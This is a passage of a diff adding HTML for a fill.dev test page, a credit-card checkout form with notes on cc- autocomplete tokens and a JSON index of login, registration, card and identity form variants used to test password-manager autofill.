+                                        Express</option><option
+                                        value="discover">Discover</option></select></div><div
+                                class="flex flex-col gap-1.5"><label
+                                    class="block font-medium text-fg text-sm"
+                                    for="cc-number">Card number</label><input
+                                    autocomplete="cc-number" id="cc-number"
+                                    inputmode="numeric" name="cc-number"
+                                    required type="text"
+                                    class="field-control" /></div><div
+                                class="grid grid-cols-2 gap-4"><div
+                                    class="flex flex-col gap-1.5"><label
+                                        class="block font-medium text-fg text-sm"
+                                        for="cc-exp-month">Expiry
+                                        month</label><select
+                                        autocomplete="cc-exp-month"
+                                        id="cc-exp-month" name="cc-exp-month"
+                                        required class="field-control"><option
+                                            value="1">01</option><option
+                                            value="2">02</option><option
+                                            value="3">03</option><option
+                                            value="4">04</option><option
+                                            value="5">05</option><option
+                                            value="6">06</option><option
+                                            value="7">07</option><option
+                                            value="8">08</option><option
+                                            value="9">09</option><option
+                                            value="10">10</option><option
+                                            value="11">11</option><option
+                                            value="12">12</option></select></div><div
+                                    class="flex flex-col gap-1.5"><label
+                                        class="block font-medium text-fg text-sm"
+                                        for="cc-exp-year">Expiry
+                                        year</label><select
+                                        autocomplete="cc-exp-year"
+                                        id="cc-exp-year" name="cc-exp-year"
+                                        required class="field-control"><option
+                                            value="2026">2026</option><option
+                                            value="2027">2027</option><option
+                                            value="2028">2028</option><option
+                                            value="2029">2029</option><option
+                                            value="2030">2030</option><option
+                                            value="2031">2031</option><option
+                                            value="2032">2032</option><option
+                                            value="2033">2033</option><option
+                                            value="2034">2034</option></select></div><div
+                                    class="flex flex-col gap-1.5"><label
+                                        class="block font-medium text-fg text-sm"
+                                        for="cc-csc">CVV</label><input
+                                        autocomplete="cc-csc" id="cc-csc"
+                                        inputmode="numeric" name="cc-csc"
+                                        required type="text"
+                                        class="field-control" /></div></div><div><button
+                                    class="inline-flex items-center justify-center rounded-full px-5 py-2 font-medium text-sm shadow-card outline-accent/60 transition focus-visible:outline-2 focus-visible:outline-offset-2 bg-accent text-on-accent hover:brightness-110"
+                                    type="submit">Pay</button></div></form></div><div
+                        class="mt-10 max-w-2xl"><aside
+                            aria-labelledby="notes-title"
+                            class="flex flex-col gap-3 text-fg-muted text-sm leading-relaxed xl:max-w-md"><h2
+                                class="font-semibold text-fg-subtle text-xs uppercase tracking-wider"
+                                id="notes-title">Notes</h2><p>The card fields
+                                use the <code>cc-</code> family: <a
+                                    class="font-mono text-accent hover:underline"
+                                    href="https://html.spec.whatwg.org/multipage/form-control-infrastructure.html#attr-fe-autocomplete-cc-name"><code>cc-name</code></a>,
+                                <a class="font-mono text-accent hover:underline"
+                                    href="https://html.spec.whatwg.org/multipage/form-control-infrastructure.html#attr-fe-autocomplete-cc-number"><code>cc-number</code></a>,
+                                <a class="font-mono text-accent hover:underline"
+                                    href="https://html.spec.whatwg.org/multipage/form-control-infrastructure.html#attr-fe-autocomplete-cc-csc"><code>cc-csc</code></a>,
+                                and the expiry split into <a
+                                    class="font-mono text-accent hover:underline"
+                                    href="https://html.spec.whatwg.org/multipage/form-control-infrastructure.html#attr-fe-autocomplete-cc-exp-month"><code>cc-exp-month</code></a>
+                                and <a
+                                    class="font-mono text-accent hover:underline"
+                                    href="https://html.spec.whatwg.org/multipage/form-control-infrastructure.html#attr-fe-autocomplete-cc-exp-year"><code>cc-exp-year</code></a>
+                                selects. A filler must match its stored expiry
+                                against option values (<code>1</code> to
+                                <code>12</code>, four-digit years), not the
+                                visible labels.</p><p><a
+                                    class="font-mono text-accent hover:underline"
+                                    href="https://html.spec.whatwg.org/multipage/form-control-infrastructure.html#attr-fe-autocomplete-cc-type"><code>cc-type</code></a>
+                                is a select with the vendor-ish values
+                                <code>visa</code>, <code>mc</code>,
+                                <code>amex</code> and <code>discover</code>, so
+                                brand detection from the number is the only
+                                reliable way to pick one. See <a
+                                    class="font-medium text-fg underline decoration-line underline-offset-2 transition hover:text-accent"
+                                    href="https://support.1password.com/compatible-website-design">1Password&#39;s
+                                    developer guide</a> for checkout
+                                guidance.</p></aside></div></main><footer
+                    class="mx-auto w-full max-w-6xl px-6 py-8"><div
+                        class="flex flex-col items-center justify-between gap-4 border-line border-t pt-6 text-fg-subtle text-sm sm:flex-row"><p
+                            class="text-center sm:text-left">Made with 💜 by <a
+                                class="font-medium text-fg-muted transition hover:text-accent"
+                                href="https://beyer.dev">Beyer</a><span
+                                class="mx-2">·</span><button
+                                class="font-medium text-fg-muted underline decoration-line underline-offset-2 transition hover:text-accent"
+                                data-open-dialog="legal" type="button">Legal
+                                notice</button></p><fieldset
+                            class="glass inline-flex h-8 items-center gap-0.5 rounded-full border border-line px-0.5 shadow-card"
+                            data-theme-picker="true"><legend
+                                class="sr-only">Colour theme</legend><button
+                                aria-label="Light theme" aria-pressed="false"
+                                class="flex size-7 items-center justify-center rounded-full text-fg-subtle transition hover:text-fg aria-pressed:bg-accent-soft aria-pressed:text-fg"
+                                data-set-theme="light" title="Light"
+                                type="button"><svg aria-hidden="true"
+                                    class="size-4" fill="currentColor"
+                                    viewBox="0 0 256 256"
+                                    xmlns="http://www.w3.org/2000/svg"><path
+                                        d="M120,40V16a8,8,0,0,1,16,0V40a8,8,0,0,1-16,0Zm72,88a64,64,0,1,1-64-64A64.07,64.07,0,0,1,192,128Zm-16,0a48,48,0,1,0-48,48A48.05,48.05,0,0,0,176,128ZM58.34,69.66A8,8,0,0,0,69.66,58.34l-16-16A8,8,0,0,0,42.34,53.66Zm0,116.68-16,16a8,8,0,0,0,11.32,11.32l16-16a8,8,0,0,0-11.32-11.32ZM192,72a8,8,0,0,0,5.66-2.34l16-16a8,8,0,0,0-11.32-11.32l-16,16A8,8,0,0,0,192,72Zm5.66,114.34a8,8,0,0,0-11.32,11.32l16,16a8,8,0,0,0,11.32-11.32ZM48,128a8,8,0,0,0-8-8H16a8,8,0,0,0,0,16H40A8,8,0,0,0,48,128Zm80,80a8,8,0,0,0-8,8v24a8,8,0,0,0,16,0V216A8,8,0,0,0,128,208Zm112-88H216a8,8,0,0,0,0,16h24a8,8,0,0,0,0-16Z"></path></svg></button><button
+                                aria-label="Dark theme" aria-pressed="false"
+                                class="flex size-7 items-center justify-center rounded-full text-fg-subtle transition hover:text-fg aria-pressed:bg-accent-soft aria-pressed:text-fg"
+                                data-set-theme="dark" title="Dark"
+                                type="button"><svg aria-hidden="true"
+                                    class="size-4" fill="currentColor"
+                                    viewBox="0 0 256 256"
+                                    xmlns="http://www.w3.org/2000/svg"><path
+                                        d="M233.54,142.23a8,8,0,0,0-8-2,88.08,88.08,0,0,1-109.8-109.8,8,8,0,0,0-10-10,104.84,104.84,0,0,0-52.91,37A104,104,0,0,0,136,224a103.09,103.09,0,0,0,62.52-20.88,104.84,104.84,0,0,0,37-52.91A8,8,0,0,0,233.54,142.23ZM188.9,190.34A88,88,0,0,1,65.66,67.11a89,89,0,0,1,31.4-26A106,106,0,0,0,96,56,104.11,104.11,0,0,0,200,160a106,106,0,0,0,14.92-1.06A89,89,0,0,1,188.9,190.34Z"></path></svg></button><button
+                                aria-label="System theme" aria-pressed="false"
+                                class="flex size-7 items-center justify-center rounded-full text-fg-subtle transition hover:text-fg aria-pressed:bg-accent-soft aria-pressed:text-fg"
+                                data-set-theme="system" title="System"
+                                type="button"><svg aria-hidden="true"
+                                    class="size-4" fill="currentColor"
+                                    viewBox="0 0 256 256"
+                                    xmlns="http://www.w3.org/2000/svg"><path
+                                        d="M208,40H48A24,24,0,0,0,24,64V176a24,24,0,0,0,24,24H208a24,24,0,0,0,24-24V64A24,24,0,0,0,208,40Zm8,136a8,8,0,0,1-8,8H48a8,8,0,0,1-8-8V64a8,8,0,0,1,8-8H208a8,8,0,0,1,8,8Zm-48,48a8,8,0,0,1-8,8H96a8,8,0,0,1,0-16h64A8,8,0,0,1,168,224Z"></path></svg></button></fieldset></div><dialog
+                        aria-labelledby="legal-title"
+                        class="m-auto w-[min(92vw,34rem)] rounded-2xl border border-line bg-surface p-0 text-fg shadow-card-hover backdrop:bg-black/50 backdrop:backdrop-blur-sm"
+                        id="legal"><div class="flex flex-col gap-4 p-6"><div
+                                class="flex items-start justify-between gap-4"><h2
+                                    class="font-semibold text-fg text-lg tracking-tight"
+                                    id="legal-title">Legal notice</h2><button
+                                    aria-label="Close"
+                                    class="-mt-1 -mr-1 rounded-full p-1.5 text-fg-subtle transition hover:bg-surface-raised hover:text-fg"
+                                    data-close-dialog="legal"
+                                    type="button"><span aria-hidden="true"
+                                        class="block text-lg leading-none">×</span></button></div><div
+                                class="flex flex-col gap-3 text-fg-muted text-sm leading-relaxed"><p>fill.dev
+                                    is an independent project built by Andrew
+                                    Beyer during his tenure at 1Password. As he
+                                    is no longer employed by AgileBits, it is
+                                    not affiliated with, endorsed by, or
+                                    maintained by 1Password or AgileBits
+                                    Inc.</p><p>1Password and the 1Password logo
+                                    are trademarks and property of AgileBits
+                                    Inc. The Save in 1Password button appears
+                                    here only to exercise saving into
+                                    1Password.</p><p>Nothing you submit on this
+                                    site is stored. Form posts are echoed back
+                                    to you and then discarded. Sample values,
+                                    including card numbers, are randomly
+                                    generated test data. Never enter real
+                                    credentials, card details, or personal
+                                    information here.</p><p>This site is owned
+                                    and operated by sudo, LLC. Inquiries,
+                                    corrections, and sternly worded letters
+                                    (cease-and-desists gratefully accepted in a
+                                    friendly font, and as a PDF rather than a
+                                    Word document, please) can all go to <a
+                                        class="font-medium text-fg underline decoration-line underline-offset-2 transition hover:text-accent"
+                                        href="/cdn-cgi/l/email-protection#543831333538142721303b7a303122"><span
+                                            class="__cf_email__"
+                                            data-cfemail="711d1416101d310204151e5f151407">[email&#160;protected]</span></a>.</p></div><div
+                                class="flex justify-end"><button
+                                    class="rounded-full bg-accent-soft px-4 py-1.5 font-medium text-fg text-sm transition hover:ring-1 hover:ring-accent/40"
+                                    data-close-dialog="legal"
+                                    type="button">Close</button></div></div></dialog></footer></div></div><dialog
+            aria-label="Search pages"
+            class="m-auto w-[min(92vw,38rem)] rounded-2xl border border-line bg-surface p-0 text-fg shadow-card-hover backdrop:bg-black/50 backdrop:backdrop-blur-sm"
+            id="palette"><div class="flex flex-col"><input
+                    aria-autocomplete="list" aria-controls="palette-results"
+                    aria-expanded="true" autocomplete="off"
+                    class="w-full rounded-t-2xl border-line border-b bg-transparent px-5 py-4 text-fg outline-none placeholder:text-fg-subtle"
+                    data-palette-input="true"
+                    placeholder="Search pages, categories or autocomplete tokens…"
+                    role="combobox" spellcheck="false" type="search" /><div
+                    class="h-[min(24rem,55vh)] overflow-y-auto p-2"
+                    data-palette-results="true" id="palette-results"
+                    role="listbox"></div><p
+                    class="flex justify-between border-line border-t px-5 py-2 text-fg-subtle text-xs"><span>↑↓
+                        to move · ↵ to open · esc to close · <span
+                            class="inline-flex font-mono text-[10px]"><kbd
+                                class="kbd-mac">⌘K</kbd><kbd
+                                class="kbd-other">Ctrl K</kbd></span> to
+                        toggle</span></p></div><script data-cfasync="false"
+                src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script>
+        <script
+                id="forms-index"
+                type="application/json">[{"category":"login","categoryLabel":"Login","description":"Sign-in forms in every shape a password manager meets in the wild.","kind":"form","path":"/login","slug":"login","title":"Login","tokens":["username","current-password"]},{"category":"login","categoryLabel":"Login","description":"Username, then password on a new page","kind":"form","path":"/login?flow=multistep","slug":"login","title":"Login · Multi-step","tokens":["username"]},{"category":"login","categoryLabel":"Login","description":"The browser’s own 401 credential dialog instead of a form","kind":"page","path":"/login?flow=basic","slug":"login","title":"Login · HTTP Basic Auth","tokens":[]},{"category":"login","categoryLabel":"Login","description":"Steps are swapped in by script without navigation","kind":"form","path":"/login?paging=spa","slug":"login","title":"Login · Single page","tokens":["username","current-password"]},{"category":"login","categoryLabel":"Login","description":"A one-time-code field, on the form or as an extra step","kind":"form","path":"/login?factor=totp","slug":"login","title":"Login · TOTP","tokens":["username","current-password","one-time-code"]},{"category":"login","categoryLabel":"Login","description":"A passkey assertion after the password","kind":"form","path":"/login?factor=passkey","slug":"login","title":"Login · Passkey","tokens":["username","current-password"]},{"category":"login","categoryLabel":"Login","description":"Three “Continue with” buttons","kind":"form","path":"/login?providers=few","slug":"login","title":"Login · A few","tokens":["username","current-password"]},{"category":"login","categoryLabel":"Login","description":"Over a hundred sign-in buttons","kind":"form","path":"/login?providers=wall","slug":"login","title":"Login · A wall","tokens":["username","current-password"]},{"category":"login","categoryLabel":"Login","description":"No autocomplete tokens at all","kind":"form","path":"/login?attributes=untagged","slug":"login","title":"Login · Untagged","tokens":[]},{"category":"login","categoryLabel":"Login","description":"Wrong names, wrong tokens, no password type","kind":"form","path":"/login?attributes=broken","slug":"login","title":"Login · Broken","tokens":["search"]},{"category":"login","categoryLabel":"Login","description":"data-1p-ignore on each input","kind":"form","path":"/login?ignore=fields","slug":"login","title":"Login · Fields","tokens":["username","current-password"]},{"category":"login","categoryLabel":"Login","description":"data-1p-ignore on \u003cbody>","kind":"form","path":"/login?ignore=body","slug":"login","title":"Login · Body","tokens":["username","current-password"]},{"category":"login","categoryLabel":"Login","description":"Native \u003cdialog>, modal or non-modal","kind":"form","path":"/login?container=dialog","slug":"login","title":"Login · Dialog","tokens":["username","current-password"]},{"category":"login","categoryLabel":"Login","description":"Fixed to the top-right corner","kind":"form","path":"/login?container=dialog-positioned","slug":"login","title":"Login · Positioned dialog","tokens":["username","current-password"]},{"category":"login","categoryLabel":"Login","description":"Same-origin child frame","kind":"page","path":"/login?container=iframe","slug":"login","title":"Login · iframe","tokens":["username","current-password"]},{"category":"login","categoryLabel":"Login","description":"Two frames deep","kind":"page","path":"/login?container=nested-iframe","slug":"login","title":"Login · Nested iframe","tokens":["username","current-password"]},{"category":"login","categoryLabel":"Login","description":"Legacy \u003cframeset> document","kind":"page","path":"/login?container=frameset","slug":"login","title":"Login · Frameset","tokens":["username","current-password"]},{"category":"login","categoryLabel":"Login","description":"Declarative open shadow root","kind":"shadow","path":"/login?container=shadow","slug":"login","title":"Login · Shadow DOM","tokens":["username","current-password"]},{"category":"login","categoryLabel":"Login","description":"display:none until a click","kind":"form","path":"/login?reveal=display-none","slug":"login","title":"Login · display:none","tokens":["username","current-password"]},{"category":"login","categoryLabel":"Login","description":"0×0 clipping wrapper until a click","kind":"form","path":"/login?reveal=zero-size","slug":"login","title":"Login · Zero size","tokens":["username","current-password"]},{"category":"login","categoryLabel":"Login","description":"Injected from a \u003ctemplate>, shown 2s later","kind":"form","path":"/login?reveal=inserted","slug":"login","title":"Login · Inserted later","tokens":["username","current-password"]},{"category":"login","categoryLabel":"Login","description":"Four viewports below the fold","kind":"form","path":"/login?reveal=scroll","slug":"login","title":"Login · Below the fold","tokens":["username","current-password"]},{"category":"login","categoryLabel":"Login","description":"Inputs in a \u003cdiv>, posted with fetch","kind":"noform","path":"/login?markup=noform","slug":"login","title":"Login · No \u003cform>","tokens":["username","current-password"]},{"category":"login","categoryLabel":"Login","description":"Marketing page with hundreds of nodes and other forms","kind":"form","path":"/login?weight=heavy","slug":"login","title":"Login · Heavy","tokens":["username","current-password"]},{"category":"login","categoryLabel":"Login","description":"Heavy plus a DOM that mutates every 120ms","kind":"form","path":"/login?weight=mutating","slug":"login","title":"Login · Mutating","tokens":["username","current-password"]},{"category":"registration","categoryLabel":"Registration","description":"Sign-up forms: identifiers, multi-step flows, password rules and second-factor enrolment.","kind":"form","path":"/registration","slug":"registration","title":"Registration","tokens":["email","new-password"]},{"category":"registration","categoryLabel":"Registration","description":"Identifier: Username","kind":"form","path":"/registration?identifier=username","slug":"registration","title":"Registration · Username","tokens":["username","new-password"]},{"category":"registration","categoryLabel":"Registration","description":"Identifier: Email and username","kind":"form","path":"/registration?identifier=both","slug":"registration","title":"Registration · Email and username","tokens":["email","username","new-password"]},{"category":"registration","categoryLabel":"Registration","description":"Identifier first, then passwords","kind":"form","path":"/registration?flow=multistep","slug":"registration","title":"Registration · Multi-step","tokens":["email"]},{"category":"registration","categoryLabel":"Registration","description":"Steps are swapped in by script without navigation","kind":"form","path":"/registration?paging=spa","slug":"registration","title":"Registration · Single page","tokens":["email","new-password"]},{"category":"registration","categoryLabel":"Registration","description":"Show a TOTP QR code after the password step","kind":"form","path":"/registration?factor=qr","slug":"registration","title":"Registration · TOTP, QR only","tokens":["email","new-password"]},{"category":"registration","categoryLabel":"Registration","description":"Show a QR code and verify the code you enter","kind":"form","path":"/registration?factor=verified","slug":"registration","title":"Registration · TOTP, verified","tokens":["email","new-password"]},{"category":"registration","categoryLabel":"Registration","description":"Register a passkey after the password step","kind":"form","path":"/registration?factor=passkey","slug":"registration","title":"Registration · Passkey","tokens":["email","new-password"]},{"category":"registration","categoryLabel":"Registration","description":"Three “Sign up with” buttons","kind":"form","path":"/registration?providers=few","slug":"registration","title":"Registration · A few","tokens":["email","new-password"]},{"category":"registration","categoryLabel":"Registration","description":"Every social login we could find","kind":"form","path":"/registration?providers=wall","slug":"registration","title":"Registration · A wall","tokens":["email","new-password"]},{"category":"registration","categoryLabel":"Registration","description":"minlength: 6; maxlength: 16;","kind":"form","path":"/registration?rules=length","slug":"registration","title":"Registration · Min and max length","tokens":["email","new-password"]},{"category":"registration","categoryLabel":"Registration","description":"minlength: 6; required: lower, upper; required: digit;","kind":"form","path":"/registration?rules=mixed","slug":"registration","title":"Registration · Mixed case and a digit","tokens":["email","new-password"]},{"category":"registration","categoryLabel":"Registration","description":"minlength: 10; required: lower; required: upper; required: digit; required: special;","kind":"form","path":"/registration?rules=complex","slug":"registration","title":"Registration · Full complexity","tokens":["email","new-password"]},{"category":"registration","categoryLabel":"Registration","description":"minlength: 8; maxlength: 15; required: digit; required: special; required: upper, lower;","kind":"form","path":"/registration?rules=capped","slug":"registration","title":"Registration · Mixed plus special, capped","tokens":["email","new-password"]},{"category":"registration","categoryLabel":"Registration","description":"minlength: 8; required: upper; required: [-_.]; allowed: lower, digit;","kind":"form","path":"/registration?rules=limited","slug":"registration","title":"Registration · Uppercase and limited specials","tokens":["email","new-password"]},{"category":"registration","categoryLabel":"Registration","description":"minlength: 20; maxlength: 128;","kind":"form","path":"/registration?rules=long","slug":"registration","title":"Registration · Long password","tokens":["email","new-password"]},{"category":"registration","categoryLabel":"Registration","description":"No autocomplete tokens at all","kind":"form","path":"/registration?attributes=untagged","slug":"registration","title":"Registration · Untagged","tokens":[]},{"category":"registration","categoryLabel":"Registration","description":"Native \u003cdialog>, modal or non-modal","kind":"form","path":"/registration?container=dialog","slug":"registration","title":"Registration · Dialog","tokens":["email","new-password"]},{"category":"registration","categoryLabel":"Registration","description":"Fixed to the top-right corner","kind":"form","path":"/registration?container=dialog-positioned","slug":"registration","title":"Registration · Positioned dialog","tokens":["email","new-password"]},{"category":"registration","categoryLabel":"Registration","description":"Same-origin child frame","kind":"page","path":"/registration?container=iframe","slug":"registration","title":"Registration · iframe","tokens":["email","new-password"]},{"category":"registration","categoryLabel":"Registration","description":"Two frames deep","kind":"page","path":"/registration?container=nested-iframe","slug":"registration","title":"Registration · Nested iframe","tokens":["email","new-password"]},{"category":"registration","categoryLabel":"Registration","description":"Legacy \u003cframeset> document","kind":"page","path":"/registration?container=frameset","slug":"registration","title":"Registration · Frameset","tokens":["email","new-password"]},{"category":"registration","categoryLabel":"Registration","description":"Declarative open shadow root","kind":"shadow","path":"/registration?container=shadow","slug":"registration","title":"Registration · Shadow DOM","tokens":["email","new-password"]},{"category":"registration","categoryLabel":"Registration","description":"display:none until a click","kind":"form","path":"/registration?reveal=display-none","slug":"registration","title":"Registration · display:none","tokens":["email","new-password"]},{"category":"registration","categoryLabel":"Registration","description":"0×0 clipping wrapper until a click","kind":"form","path":"/registration?reveal=zero-size","slug":"registration","title":"Registration · Zero size","tokens":["email","new-password"]},{"category":"registration","categoryLabel":"Registration","description":"Injected from a \u003ctemplate>, shown 2s later","kind":"form","path":"/registration?reveal=inserted","slug":"registration","title":"Registration · Inserted later","tokens":["email","new-password"]},{"category":"registration","categoryLabel":"Registration","description":"Four viewports below the fold","kind":"form","path":"/registration?reveal=scroll","slug":"registration","title":"Registration · Below the fold","tokens":["email","new-password"]},{"category":"registration","categoryLabel":"Registration","description":"Inputs in a \u003cdiv>, posted with fetch","kind":"noform","path":"/registration?markup=noform","slug":"registration","title":"Registration · No \u003cform>","tokens":["email","new-password"]},{"category":"registration","categoryLabel":"Registration","description":"Marketing page with hundreds of nodes and other forms","kind":"form","path":"/registration?weight=heavy","slug":"registration","title":"Registration · Heavy","tokens":["email","new-password"]},{"category":"registration","categoryLabel":"Registration","description":"Heavy plus a DOM that mutates every 120ms","kind":"form","path":"/registration?weight=mutating","slug":"registration","title":"Registration · Mutating","tokens":["email","new-password"]},{"category":"registration","categoryLabel":"Registration","description":"Current password plus a new one entered twice, on one page or two.","kind":"form","path":"/change-password","slug":"change-password","title":"Change password","tokens":["current-password","new-password"]},{"category":"registration","categoryLabel":"Registration","description":"Current password first, then the new one","kind":"form","path":"/change-password?flow=multistep","slug":"change-password","title":"Change password · Multi-step","tokens":["current-password"]},{"category":"registration","categoryLabel":"Registration","description":"Steps are swapped in by script without navigation","kind":"form","path":"/change-password?paging=spa","slug":"change-password","title":"Change password · Single page","tokens":["current-password","new-password"]},{"category":"registration","categoryLabel":"Registration","description":"No autocomplete tokens at all","kind":"form","path":"/change-password?attributes=untagged","slug":"change-password","title":"Change password · Untagged","tokens":[]},{"category":"registration","categoryLabel":"Registration","description":"Native \u003cdialog>, modal or non-modal","kind":"form","path":"/change-password?container=dialog","slug":"change-password","title":"Change password · Dialog","tokens":["current-password","new-password"]},{"category":"registration","categoryLabel":"Registration","description":"Fixed to the top-right corner","kind":"form","path":"/change-password?container=dialog-positioned","slug":"change-password","title":"Change password · Positioned dialog","tokens":["current-password","new-password"]},{"category":"registration","categoryLabel":"Registration","description":"Same-origin child frame","kind":"page","path":"/change-password?container=iframe","slug":"change-password","title":"Change password · iframe","tokens":["current-password","new-password"]},{"category":"registration","categoryLabel":"Registration","description":"Two frames deep","kind":"page","path":"/change-password?container=nested-iframe","slug":"change-password","title":"Change password · Nested iframe","tokens":["current-password","new-password"]},{"category":"registration","categoryLabel":"Registration","description":"Legacy \u003cframeset> document","kind":"page","path":"/change-password?container=frameset","slug":"change-password","title":"Change password · Frameset","tokens":["current-password","new-password"]},{"category":"registration","categoryLabel":"Registration","description":"Declarative open shadow root","kind":"shadow","path":"/change-password?container=shadow","slug":"change-password","title":"Change password · Shadow DOM","tokens":["current-password","new-password"]},{"category":"registration","categoryLabel":"Registration","description":"display:none until a click","kind":"form","path":"/change-password?reveal=display-none","slug":"change-password","title":"Change password · display:none","tokens":["current-password","new-password"]},{"category":"registration","categoryLabel":"Registration","description":"0×0 clipping wrapper until a click","kind":"form","path":"/change-password?reveal=zero-size","slug":"change-password","title":"Change password · Zero size","tokens":["current-password","new-password"]},{"category":"registration","categoryLabel":"Registration","description":"Injected from a \u003ctemplate>, shown 2s later","kind":"form","path":"/change-password?reveal=inserted","slug":"change-password","title":"Change password · Inserted later","tokens":["current-password","new-password"]},{"category":"registration","categoryLabel":"Registration","description":"Four viewports below the fold","kind":"form","path":"/change-password?reveal=scroll","slug":"change-password","title":"Change password · Below the fold","tokens":["current-password","new-password"]},{"category":"registration","categoryLabel":"Registration","description":"Inputs in a \u003cdiv>, posted with fetch","kind":"noform","path":"/change-password?markup=noform","slug":"change-password","title":"Change password · No \u003cform>","tokens":["current-password","new-password"]},{"category":"registration","categoryLabel":"Registration","description":"Marketing page with hundreds of nodes and other forms","kind":"form","path":"/change-password?weight=heavy","slug":"change-password","title":"Change password · Heavy","tokens":["current-password","new-password"]},{"category":"registration","categoryLabel":"Registration","description":"Heavy plus a DOM that mutates every 120ms","kind":"form","path":"/change-password?weight=mutating","slug":"change-password","title":"Change password · Mutating","tokens":["current-password","new-password"]},{"category":"credit-card","categoryLabel":"Credit Card","description":"Checkout card forms with split or combined expiry fields.","kind":"form","path":"/credit-card","slug":"credit-card","title":"Credit card","tokens":["cc-name","cc-type","cc-number","cc-exp-month","cc-exp-year","cc-csc"]},{"category":"credit-card","categoryLabel":"Credit Card","description":"One MM/YY text field","kind":"form","path":"/credit-card?expiry=combined","slug":"credit-card","title":"Credit card · Combined MM/YY","tokens":["cc-name","cc-type","cc-number","cc-exp","cc-csc"]},{"category":"credit-card","categoryLabel":"Credit Card","description":"No cc-type field","kind":"form","path":"/credit-card?type=none","slug":"credit-card","title":"Credit card · None","tokens":["cc-name","cc-number","cc-exp-month","cc-exp-year","cc-csc"]},{"category":"credit-card","categoryLabel":"Credit Card","description":"Native \u003cdialog>, modal or non-modal","kind":"form","path":"/credit-card?container=dialog","slug":"credit-card","title":"Credit card · Dialog","tokens":["cc-name","cc-type","cc-number","cc-exp-month","cc-exp-year","cc-csc"]},{"category":"credit-card","categoryLabel":"Credit Card","description":"Fixed to the top-right corner","kind":"form","path":"/credit-card?container=dialog-positioned","slug":"credit-card","title":"Credit card · Positioned dialog","tokens":["cc-name","cc-type","cc-number","cc-exp-month","cc-exp-year","cc-csc"]},{"category":"credit-card","categoryLabel":"Credit Card","description":"Same-origin child frame","kind":"page","path":"/credit-card?container=iframe","slug":"credit-card","title":"Credit card · iframe","tokens":["cc-name","cc-type","cc-number","cc-exp-month","cc-exp-year","cc-csc"]},{"category":"credit-card","categoryLabel":"Credit Card","description":"Two frames deep","kind":"page","path":"/credit-card?container=nested-iframe","slug":"credit-card","title":"Credit card · Nested iframe","tokens":["cc-name","cc-type","cc-number","cc-exp-month","cc-exp-year","cc-csc"]},{"category":"credit-card","categoryLabel":"Credit Card","description":"Legacy \u003cframeset> document","kind":"page","path":"/credit-card?container=frameset","slug":"credit-card","title":"Credit card · Frameset","tokens":["cc-name","cc-type","cc-number","cc-exp-month","cc-exp-year","cc-csc"]},{"category":"credit-card","categoryLabel":"Credit Card","description":"Declarative open shadow root","kind":"shadow","path":"/credit-card?container=shadow","slug":"credit-card","title":"Credit card · Shadow DOM","tokens":["cc-name","cc-type","cc-number","cc-exp-month","cc-exp-year","cc-csc"]},{"category":"credit-card","categoryLabel":"Credit Card","description":"display:none until a click","kind":"form","path":"/credit-card?reveal=display-none","slug":"credit-card","title":"Credit card · display:none","tokens":["cc-name","cc-type","cc-number","cc-exp-month","cc-exp-year","cc-csc"]},{"category":"credit-card","categoryLabel":"Credit Card","description":"0×0 clipping wrapper until a click","kind":"form","path":"/credit-card?reveal=zero-size","slug":"credit-card","title":"Credit card · Zero size","tokens":["cc-name","cc-type","cc-number","cc-exp-month","cc-exp-year","cc-csc"]},{"category":"credit-card","categoryLabel":"Credit Card","description":"Injected from a \u003ctemplate>, shown 2s later","kind":"form","path":"/credit-card?reveal=inserted","slug":"credit-card","title":"Credit card · Inserted later","tokens":["cc-name","cc-type","cc-number","cc-exp-month","cc-exp-year","cc-csc"]},{"category":"credit-card","categoryLabel":"Credit Card","description":"Four viewports below the fold","kind":"form","path":"/credit-card?reveal=scroll","slug":"credit-card","title":"Credit card · Below the fold","tokens":["cc-name","cc-type","cc-number","cc-exp-month","cc-exp-year","cc-csc"]},{"category":"credit-card","categoryLabel":"Credit Card","description":"Inputs in a \u003cdiv>, posted with fetch","kind":"noform","path":"/credit-card?markup=noform","slug":"credit-card","title":"Credit card · No \u003cform>","tokens":["cc-name","cc-type","cc-number","cc-exp-month","cc-exp-year","cc-csc"]},{"category":"credit-card","categoryLabel":"Credit Card","description":"Marketing page with hundreds of nodes and other forms","kind":"form","path":"/credit-card?weight=heavy","slug":"credit-card","title":"Credit card · Heavy","tokens":["cc-name","cc-type","cc-number","cc-exp-month","cc-exp-year","cc-csc"]},{"category":"credit-card","categoryLabel":"Credit Card","description":"Heavy plus a DOM that mutates every 120ms","kind":"form","path":"/credit-card?weight=mutating","slug":"credit-card","title":"Credit card · Mutating","tokens":["cc-name","cc-type","cc-number","cc-exp-month","cc-exp-year","cc-csc"]},{"category":"identity","categoryLabel":"Identity","description":"Name, contact and postal address forms, with native or custom widgets and wizards.","kind":"form","path":"/identity","slug":"identity","title":"Identity","tokens":["given-name","additional-name","family-name","email","tel","address-line1","address-line2","address-level2","address-level1","postal-code","country"]},{"category":"identity","categoryLabel":"Identity","description":"Name, email and phone only","kind":"form","path":"/identity?fields=contact","slug":"identity","title":"Identity · Name and contact","tokens":["given-name","additional-name","family-name","email","tel"]},{"category":"identity","categoryLabel":"Identity","description":"Country as an \u003cinput list>","kind":"form","path":"/identity?widgets=datalist","slug":"identity","title":"Identity · Datalist","tokens":["given-name","additional-name","family-name","email","tel","address-line1","address-line2","address-level2","address-level1","postal-code","country"]},{"category":"identity","categoryLabel":"Identity","description":"Street and city as ARIA comboboxes","kind":"form","path":"/identity?widgets=combobox","slug":"identity","title":"Identity · Combobox","tokens":["given-name","additional-name","family-name","email","tel","list","address-line1","address-line2","address-level2","address-level1","postal-code","country"]},{"category":"identity","categoryLabel":"Identity","description":"Name, contact, review, one page each","kind":"form","path":"/identity?flow=wizard","slug":"identity","title":"Identity · Wizard","tokens":["given-name","additional-name","family-name"]},{"category":"identity","categoryLabel":"Identity","description":"Steps are swapped in by script without navigation","kind":"form","path":"/identity?paging=spa","slug":"identity","title":"Identity · Single page","tokens":["given-name","additional-name","family-name","email","tel","address-line1","address-line2","address-level2","address-level1","postal-code","country"]},{"category":"identity","categoryLabel":"Identity","description":"Native \u003cdialog>, modal or non-modal","kind":"form","path":"/identity?container=dialog","slug":"identity","title":"Identity · Dialog","tokens":["given-name","additional-name","family-name","email","tel","address-line1","address-line2","address-level2","address-level1","postal-code","country"]},{"category":"identity","categoryLabel":"Identity","description":"Fixed to the top-right corner","kind":"form","path":"/identity?container=dialog-positioned","slug":"identity","title":"Identity · Positioned 